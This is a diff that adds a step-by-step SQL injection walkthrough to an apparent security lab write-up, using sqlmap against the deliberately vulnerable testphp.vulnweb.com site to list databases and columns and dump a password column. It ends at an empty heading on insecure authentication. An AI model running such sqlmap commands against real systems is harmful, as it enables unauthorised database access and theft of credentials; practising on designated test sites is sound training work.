@@ -51,9 +51,53 @@
 ***2. SQL injection Vulnerability***
 
 - Step 1 : In first step first we found the phpid of ***testphp.vulnweb.com*** site.
+
+  ![image](https://github.com/user-attachments/assets/61e8736f-0775-411b-b199-ee06e6a0dc08)
+
+- Step 2 : copy The given url.
+
 ```URL
 http://testphp.vulnweb.com/artists.php?artist=1
 ```
+- Step 3 : open the kali linux terminal.
+- Now write the given command for perform SQL injection.
+- here -u refers for URL & --dbs for database.
+
+```URL
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs
+```
+![image](https://github.com/user-attachments/assets/ac991ea7-e099-4417-9ea8-cc054b60b2bb)
+![image](https://github.com/user-attachments/assets/1cc8b432-8ff6-4992-909b-89e7eaeec607)
+
+- Now you see that we got a two databases. first is acuart and second is information_schema.
+- Now we go to the inner in acuart database.
+
+- Step 4 : Now follow this commnd for find columns in acuart database.
+```COMMAND
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --columns
+```
+![image](https://github.com/user-attachments/assets/d49730b3-fdac-422b-a83e-a10d4ca7e44d)
+![image](https://github.com/user-attachments/assets/b27503b2-9ecb-436e-a738-c7f27ecce8b1)
+![image](https://github.com/user-attachments/assets/642a7e93-afa0-42cf-afec-dca12106f875)
+
+- Now you see we got columns of databases.
+
+- step 5 : Now we got data from pass columns.
+- Now follow this command for find data on pass columns.
+
+```COMMAND
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -C pass  --dump
+```
+![image](https://github.com/user-attachments/assets/0cea7771-9a3f-4ca4-959d-3b96360ebee3)
+![image](https://github.com/user-attachments/assets/be536d09-1175-4123-bec8-a4b488436316)
+
+- now you see we got the data from pass column.
+
+***3. Insecurity authentication***
+
+
+
+
   
 
 
